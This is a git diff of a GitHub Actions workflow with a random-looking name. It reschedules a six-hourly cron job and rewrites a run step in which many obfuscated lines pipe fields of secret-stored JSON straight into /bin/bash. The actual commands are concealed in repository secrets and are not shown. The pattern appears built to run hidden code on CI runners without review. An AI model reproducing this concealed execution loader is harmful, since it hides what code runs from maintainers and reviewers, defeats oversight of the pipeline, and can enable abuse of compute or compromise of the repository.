@@ -3,8 +3,7 @@ name: guoxunsu6789
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 2/6 * * *'
-
+    - cron: '22 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,17 +12,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: guoxunsu6789
         env:
-          kn9401: ${{ secrets.kn9401 }}
+          h6: ${{ secrets.h6 }}
         run: |
-          echo $kn9401 | jq -r .zsfo553 | /bin/bash
-          echo $sdc0 | jq -r .wbnau9 | /bin/bash
-          echo $cz5 | jq -r .ggym9 | /bin/bash
-          echo $qi13 | jq -r .mvaj5 | /bin/bash
-          echo $cxm876 | jq -r .mhexr146 | /bin/bash
-          echo $u27 | jq -r .wqw98 | /bin/bash
-          echo $nipgz5380 | jq -r .d371 | /bin/bash
-          echo $sfato198 | jq -r .gqs5391 | /bin/bash
-          echo $mt63271 | jq -r .ewl9414 | /bin/bash
-          echo $pbxpz45 | jq -r .n5 | /bin/bash
-          echo $qawe5 | jq -r .rlncz58 | /bin/bash
+          echo $h6 | jq -r .jk92 | /bin/bash
+          echo $dqp8479 | jq -r .nfq1970 | /bin/bash
+          echo $imcc435 | jq -r .kkbnl230 | /bin/bash
+          echo $bdhi78 | jq -r .hifc56943 | /bin/bash
+          echo $x4 | jq -r .xjjdp377 | /bin/bash
+          echo $xsr17944 | jq -r .bbpd8777 | /bin/bash
+          echo $io69034 | jq -r .vkn2145 | /bin/bash
+          echo $wi2429 | jq -r .utcoa9 | /bin/bash
+          echo $nxt10697 | jq -r .nincv772 | /bin/bash
+          echo $cjvcy30707 | jq -r .fdats9422 | /bin/bash
+          echo $ynz697 | jq -r .ikmgv4 | /bin/bash
+          echo $w9624 | jq -r .e7 | /bin/bash
+          echo $dwtjv7 | jq -r .iggl690 | /bin/bash
+          echo $y60922 | jq -r .gb419 | /bin/bash
+          echo $japox70 | jq -r .er67175 | /bin/bash
+          echo $b42569 | jq -r .h7 | /bin/bash
 
